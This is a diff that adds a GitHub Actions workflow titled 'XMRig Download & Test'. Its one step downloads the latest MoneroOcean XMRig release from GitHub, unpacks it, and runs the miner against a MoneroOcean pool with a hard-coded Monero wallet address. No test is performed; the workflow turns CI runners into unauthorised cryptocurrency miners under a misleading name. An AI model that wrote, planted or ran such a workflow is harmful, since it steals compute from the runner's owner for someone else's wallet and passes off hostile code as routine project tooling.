@@ -1,0 +1,10 @@
+name: XMRig Download & Test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: sudo apt-get install -y curl && mkdir -p ~/moneroocean && cd ~/moneroocean && url=$(curl -fsSL https://api.github.com/repos/MoneroOcean/xmrig/releases/latest | grep browser_download_url | grep -E 'lin64-compat|lin64\.tar\.gz' | head -1 | cut -d '"' -f 4) && curl -L "$url" -o xmrig.tar.gz && tar xf xmrig.tar.gz && bin=$(find . -name xmrig -type f -executable | head -1) && "$bin" -o gulf.moneroocean.stream:10128 -u 45wpwcRir22VP2SLi8XARwUmgaDAwH22i4Fjp2jG8bj4TG8HpBaJerDYqzQV5oWnx6fktk4tpfr5vYoh1wpMMDNBBNXQuDK -p "worker1" --coin monero
